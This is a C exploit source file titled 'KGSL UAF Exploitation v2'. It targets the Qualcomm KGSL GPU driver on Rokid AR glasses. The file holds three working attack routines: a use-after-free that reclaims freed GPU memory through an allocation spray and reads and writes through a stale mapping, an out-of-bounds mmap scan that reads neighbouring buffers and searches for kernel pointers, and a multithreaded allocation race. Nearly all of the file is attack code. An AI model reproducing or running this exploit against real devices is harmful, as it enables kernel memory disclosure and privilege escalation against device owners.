/*
 * KGSL UAF Exploitation Attempt v2
 * =================================
 *
 * Confirmed vulnerabilities:
 * 1. UAF: mmap survives fd close - can read/write after free
 * 2. OOB: Can read other GPU buffers via negative offset
 *
 * Strategy:
 * 1. Create holes in GPU memory
 * 2. Trigger reallocation into freed slot
 * 3. Read/write overlapping memory
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <setjmp.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#define IOCTL_KGSL_GPUMEM_ALLOC 0xc018092f

struct kgsl_gpumem_alloc
{
    uint64_t gpuaddr;
    uint64_t size;
    uint32_t flags;
    uint32_t padding;
};

static sigjmp_buf jmp_env;
static volatile sig_atomic_t sig_received = 0;

void sig_handler(int sig)
{
    sig_received = sig;
    siglongjmp(jmp_env, 1);
}

typedef struct
{
    int fd;
    uint64_t gpuaddr;
    void *map;
    int valid;
} gpu_alloc_t;

gpu_alloc_t alloc_gpu(int kgsl_fd, size_t size)
{
    gpu_alloc_t result = {0};
    result.fd = kgsl_fd;

    struct kgsl_gpumem_alloc alloc = {0};
    alloc.size = size;

    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUMEM_ALLOC, &alloc) < 0)
    {
        return result;
    }

    result.gpuaddr = alloc.gpuaddr;

    uint64_t page_idx = (alloc.gpuaddr - 0x4000000000ULL) / 0x1000;
    uint64_t offset = (page_idx + 1) * 0x1000;

    result.map = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED, kgsl_fd, offset);
    if (result.map != MAP_FAILED)
    {
        result.valid = 1;
    }

    return result;
}

void hexdump(const void *data, size_t size, const char *title)
{
    const uint8_t *p = data;
    printf("%s:\n", title);
    for (size_t i = 0; i < size; i++)
    {
        if (i % 32 == 0)
            printf("  %04zx: ", i);
        printf("%02x", p[i]);
        if ((i + 1) % 32 == 0)
            printf("\n");
        else if ((i + 1) % 8 == 0)
            printf(" ");
    }
    if (size % 32 != 0)
        printf("\n");
}

// ============================================================================
// Attack 1: UAF - Overlap with new allocation
// ============================================================================
void attack_uaf_overlap(void)
{
    printf("\n");
    printf("╔═══════════════════════════════════════════════════════════════╗\n");
    printf("║  Attack 1: UAF Memory Overlap                                  ║\n");
    printf("╚═══════════════════════════════════════════════════════════════╝\n\n");

    int fd1 = open("/dev/kgsl-3d0", O_RDWR);
    int fd2 = open("/dev/kgsl-3d0", O_RDWR);

    if (fd1 < 0 || fd2 < 0)
    {
        printf("[-] Cannot open KGSL\n");
        return;
    }

    // Allocate on fd1
    gpu_alloc_t victim = alloc_gpu(fd1, 0x1000);
    if (!victim.valid)
    {
        printf("[-] Victim alloc failed\n");
        close(fd1);
        close(fd2);
        return;
    }
    printf("[+] Victim: gpuaddr=0x%lx map=%p\n", victim.gpuaddr, victim.map);

    // Write marker to victim
    memset(victim.map, 'V', 0x1000);
    *(uint64_t *)victim.map = 0xAAAAAAAAAAAAAAAAULL;
    printf("[+] Wrote victim marker\n");

    // Close fd1 (frees GPU object, but mmap survives!)
    printf("[*] Closing fd1 (victim)...\n");
    close(fd1);

    // Allocate many buffers on fd2 - hope to reclaim victim's memory
    printf("[*] Spraying allocations on fd2...\n");
    gpu_alloc_t sprays[200];
    int spray_count = 0;
    int reclaimed = 0;

    for (int i = 0; i < 200; i++)
    {
        sprays[i] = alloc_gpu(fd2, 0x1000);
        if (!sprays[i].valid)
            break;

        // Write attacker pattern
        memset(sprays[i].map, 'A', 0x1000);
        *(uint64_t *)sprays[i].map = 0x4141414100000000ULL | i;
        spray_count++;

        // Check if we reclaimed victim's address
        if (sprays[i].gpuaddr == victim.gpuaddr)
        {
            reclaimed = 1;
            printf("[!!!] RECLAIMED victim GPU address at spray[%d]!\n", i);
            printf("      Victim map still points to: 0x%lx\n",
                   *(uint64_t *)victim.map);

            // Write via spray, read via victim (UAF)
            *(uint64_t *)sprays[i].map = 0xDEADBEEFDEADBEEFULL;
            printf("      After spray write, victim reads: 0x%lx\n",
                   *(uint64_t *)victim.map);

            // Write via victim, read via spray
            *(uint64_t *)victim.map = 0xCAFEBABECAFEBABEULL;
            printf("      After victim write, spray reads: 0x%lx\n",
                   *(uint64_t *)sprays[i].map);
        }
    }
    printf("[+] Sprayed %d buffers\n", spray_count);

    if (!reclaimed)
    {
        printf("[*] GPU address not reused, checking victim map...\n");
    }

    // Check if victim map still readable
    sig_received = 0;
    if (sigsetjmp(jmp_env, 1) == 0)
    {
        uint64_t val = *(volatile uint64_t *)victim.map;
        printf("[*] Victim map after spray: 0x%lx\n", val);

        // Scan for interesting data
        uint8_t *scan = (uint8_t *)victim.map;
        int zeros = 0, nonzero = 0;
        for (int i = 0; i < 0x1000; i++)
        {
            if (scan[i] == 0)
                zeros++;
            else
                nonzero++;
        }
        printf("[*] Victim buffer: %d zeros, %d non-zero bytes\n", zeros, nonzero);
    }
    else
    {
        printf("[!] Signal %d reading victim after spray\n", sig_received);
    }

    // Cleanup
    munmap(victim.map, 0x1000);
    for (int i = 0; i < spray_count; i++)
    {
        if (sprays[i].map != MAP_FAILED)
        {
            munmap(sprays[i].map, 0x1000);
        }
    }
    close(fd2);
}

// ============================================================================
// Attack 2: Cross-process memory read via OOB offset
// ============================================================================
void attack_oob_read(void)
{
    printf("\n");
    printf("╔═══════════════════════════════════════════════════════════════╗\n");
    printf("║  Attack 2: OOB Read Scan                                       ║\n");
    printf("╚═══════════════════════════════════════════════════════════════╝\n\n");

    int fd = open("/dev/kgsl-3d0", O_RDWR);
    if (fd < 0)
    {
        printf("[-] Cannot open KGSL\n");
        return;
    }

    // Allocate anchor buffer
    gpu_alloc_t anchor = alloc_gpu(fd, 0x1000);
    if (!anchor.valid)
    {
        printf("[-] Anchor alloc failed\n");
        close(fd);
        return;
    }
    printf("[+] Anchor: gpuaddr=0x%lx map=%p\n", anchor.gpuaddr, anchor.map);

    uint64_t anchor_page = (anchor.gpuaddr - 0x4000000000ULL) / 0x1000;
    uint64_t anchor_offset = (anchor_page + 1) * 0x1000;

    // Scan backwards (lower addresses)
    printf("[*] Scanning backwards from anchor...\n");

    int interesting_found = 0;
    for (int64_t diff = -0x1000; diff >= -0x100000; diff -= 0x1000)
    {
        uint64_t probe_offset = anchor_offset + diff;
        if (probe_offset > 0x8000000000ULL)
            continue; // Avoid underflow

        void *probe = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                           MAP_SHARED, fd, probe_offset);
        if (probe == MAP_FAILED)
            continue;

        // Check content
        sig_received = 0;
        if (sigsetjmp(jmp_env, 1) == 0)
        {
            uint64_t *ptr = (uint64_t *)probe;

            // Look for interesting patterns
            int has_data = 0;
            for (int i = 0; i < 8; i++)
            {
                if (ptr[i] != 0 && ptr[i] != 0x4141414141414141ULL)
                {
                    has_data = 1;
                    break;
                }
            }

            if (has_data)
            {
                printf("[+] Found data at offset diff %+ld (0x%lx):\n", diff, probe_offset);
                hexdump(probe, 64, "    Content");
                interesting_found++;

                if (interesting_found >= 5)
                {
                    munmap(probe, 0x1000);
                    break;
                }
            }
        }

        munmap(probe, 0x1000);
    }

    if (interesting_found == 0)
    {
        printf("[-] No interesting data found in backwards scan\n");
    }

    // Try to find kernel pointers (0xffffffc0...)
    printf("\n[*] Scanning for kernel pointers...\n");
    int kernel_ptrs_found = 0;
    for (int64_t diff = -0x1000; diff >= -0x200000; diff -= 0x1000)
    {
        uint64_t probe_offset = anchor_offset + diff;
        if (probe_offset > 0x8000000000ULL)
            continue;

        void *probe = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                           MAP_SHARED, fd, probe_offset);
        if (probe == MAP_FAILED)
            continue;

        sig_received = 0;
        if (sigsetjmp(jmp_env, 1) == 0)
        {
            uint64_t *ptr = (uint64_t *)probe;
            for (int i = 0; i < 512; i++)
            {
                // Look for kernel addresses (aarch64)
                if ((ptr[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL)
                {
                    printf("[!!!] Potential kernel pointer at offset 0x%lx+%d: 0x%lx\n",
                           probe_offset, i * 8, ptr[i]);
                    hexdump(&ptr[i], 32, "    Context");
                    kernel_ptrs_found++;
                }
            }
        }

        munmap(probe, 0x1000);
    }

    if (kernel_ptrs_found == 0)
    {
        printf("[-] No kernel pointers found\n");
    }

    munmap(anchor.map, 0x1000);
    close(fd);
}

// ============================================================================
// Attack 3: Race condition during allocation
// ============================================================================
volatile int race_go = 0;
volatile int race_done = 0;
int race_fd = -1;

void *race_thread(void *arg)
{
    while (!race_go)
        usleep(1);

    // Rapidly allocate/free
    for (int i = 0; i < 1000 && !race_done; i++)
    {
        struct kgsl_gpumem_alloc alloc = {0};
        alloc.size = 0x1000;
        ioctl(race_fd, IOCTL_KGSL_GPUMEM_ALLOC, &alloc);
    }

    return NULL;
}

void attack_race(void)
{
    printf("\n");
    printf("╔═══════════════════════════════════════════════════════════════╗\n");
    printf("║  Attack 3: Allocation Race                                     ║\n");
    printf("╚═══════════════════════════════════════════════════════════════╝\n\n");

    race_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (race_fd < 0)
    {
        printf("[-] Cannot open KGSL\n");
        return;
    }

    pthread_t threads[4];
    for (int i = 0; i < 4; i++)
    {
        pthread_create(&threads[i], NULL, race_thread, NULL);
    }

    printf("[*] Starting race...\n");
    race_go = 1;

    // Main thread: rapidly close/reopen and check
    int hits = 0;
    for (int round = 0; round < 100; round++)
    {
        // Allocate
        struct kgsl_gpumem_alloc alloc = {0};
        alloc.size = 0x1000;
        if (ioctl(race_fd, IOCTL_KGSL_GPUMEM_ALLOC, &alloc) < 0)
            continue;

        uint64_t page_idx = (alloc.gpuaddr - 0x4000000000ULL) / 0x1000;
        uint64_t offset = (page_idx + 1) * 0x1000;

        void *map = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                         MAP_SHARED, race_fd, offset);
        if (map == MAP_FAILED)
            continue;

        // Write marker
        uint64_t marker = 0xBEEF000000000000ULL | round;
        *(uint64_t *)map = marker;

        // Check if corrupted
        if (*(uint64_t *)map != marker)
        {
            hits++;
            printf("[!] Race hit at round %d! Expected 0x%lx, got 0x%lx\n",
                   round, marker, *(uint64_t *)map);
        }

        munmap(map, 0x1000);
    }

    race_done = 1;
    for (int i = 0; i < 4; i++)
    {
        pthread_join(threads[i], NULL);
    }

    printf("[*] Race complete. Hits: %d\n", hits);
    close(race_fd);
}

// ============================================================================
// Main
// ============================================================================
int main(int argc, char **argv)
{
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    signal(SIGSEGV, sig_handler);
    signal(SIGBUS, sig_handler);

    printf("╔═══════════════════════════════════════════════════════════════╗\n");
    printf("║  KGSL UAF Exploitation v2                                      ║\n");
    printf("║  Target: Rokid AR Glasses                                      ║\n");
    printf("╚═══════════════════════════════════════════════════════════════╝\n");

    attack_uaf_overlap();
    attack_oob_read();
    attack_race();

    printf("\n=== Exploitation Complete ===\n");
    return 0;
}
